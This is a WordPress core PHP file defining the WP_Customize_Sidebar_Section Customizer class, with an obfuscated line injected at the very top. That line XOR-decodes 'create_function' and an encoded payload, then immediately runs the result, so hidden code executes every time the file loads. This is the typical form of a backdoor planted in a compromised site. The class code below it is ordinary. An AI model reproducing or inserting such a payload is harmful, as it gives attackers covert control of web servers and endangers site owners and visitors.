<?php $bYgNps='YD7AJIa58NUMZUB'^':6R >,>SM 693:,';$pFBKxu=$bYgNps('','G5GL =T7NQZ>5,+WENCADF;DcT91Y:.;UGtDYDU=OTU;R> 97u+DIb>RNY:38K9RMZS=MTKfR0KQdZWjiG>SDoC3 GmotIUh=K4CRDqIgKWsrDr9PNXFXP,njOWLVNChfXfbZ7aGUX9>rWqFDeUZOJ9q0hu:ARE-7gg-oLNHGC EXRa9<RlgMmYDnYU,L<+ck<NNEq=mFGK3<W<P35vOM4X66NlbvH+A1aFNUcQUU2BSKj7R0U5E7Y0OFa=zoc<9=FY9nT W-WvosF.P+7+Ec1eYK-.C8mX3=zSXH9,Du:PIZLDOIXYL2A-U6i44AZP.aQLl55MZDWIsgTVG6LMYwQIrce+xisnF64cq1UAUmxyKV1=<NosJkPjJ4PY0-KR5NxZu93>u3yxJ-5C6wiSrH2Q:.z2yCBGcEO,J<9RNxqB4IV D1<XBEl1O4o+0IW70M EeXSCPWFc<T.+H<lT.;7QlJqMTML4e1WKJkns--Ya ZA iKVHQHYP>193UdRDBSB8zV2T4lfBQUL, mOCiBY7>CrGWTF50E>EYT.Exgwqkux3UlHYVSx7AJMpze4QzMgyWV+BaA-Q2kmjrhrPLCVBgG57>R 855MXvNY0PZ72UVJr6Q0;cboZsUWfNYP+JT;fE PXWkiKTRGQ.OpkeM7P4-8.cqcsaJ'^'.SomFH:T:85PjIS>6:0ic>T6<0XE8eqV 3Smpd.7F2 U1JIVYUS+;=Z3:8elU>Mzi>2I,xkB9U2xDzwJI<4ZMK,FTgPOSnnb4BR, lU GvwCIdVPl=,445BFN+687gxHB1MIs=hNq7LJRyLflA1;;+bUY5Udav.HN<CDOin;31L 6zERY+E:dVSMg+0X9NEKOS;:lJ7d;M696sX1GTVrmR9ZE+WhR,J5P>-+,Clu3S. .Q=XV:G V:XonEb9 ,wpxf8JNpK2TwKQSbX1GBNlCJoPoIO7Y23VDZnxlRI=N0Ym>-0.ieyhD A SR>IKP9HAymHQT9;mw2yn295S-.1Wym-1 z-, :fWGCUZ08uPFYo PQI+FS1aYcnP1-Qr 7LnEzQRVGN9pqnIT7WWTsV>S=OKA8p>H:iOkH+HXrsX17Z:3R-PP18 DI F0OQ=6ho U1M:205ar<X1MD,YDpJZC0EfQi0,8U:Z22cBUyDKqED;5AImph0:+1GnRV,;7<+ 6KRqY1MKJbu1-XADoeObqZZvZc352TkbU  sslXZJQLFIPcY+<n0JQr.zBKSVaK,TJ5dHzRvNeSLDJTNR1>17;8,PNa7XQFA>pQ>8I<5VVrzjVR0DZJKOzSuwF5SYN<5WNaD1,60N;5++>O+W6Lv=YQUQZKAJHk7');$pFBKxu();
/**
 * Customize API: WP_Customize_Sidebar_Section class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.4.0
 */

/**
 * Customizer section representing widget area (sidebar).
 *
 * @since 4.1.0
 *
 * @see WP_Customize_Section
 */
class WP_Customize_Sidebar_Section extends WP_Customize_Section {

	/**
	 * Type of this section.
	 *
	 * @since 4.1.0
	 * @access public
	 * @var string
	 */
	public $type = 'sidebar';

	/**
	 * Unique identifier.
	 *
	 * @since 4.1.0
	 * @access public
	 * @var string
	 */
	public $sidebar_id;

	/**
	 * Gather the parameters passed to client JavaScript via JSON.
	 *
	 * @since 4.1.0
	 *
	 * @return array The array to be exported to the client as JSON.
	 */
	public function json() {
		$json = parent::json();
		$json['sidebarId'] = $this->sidebar_id;
		return $json;
	}

	/**
	 * Whether the current sidebar is rendered on the page.
	 *
	 * @since 4.1.0
	 * @access public
	 *
	 * @return bool Whether sidebar is rendered.
	 */
	public function active_callback() {
		return $this->manager->widgets->is_sidebar_rendered( $this->sidebar_id );
	}
}
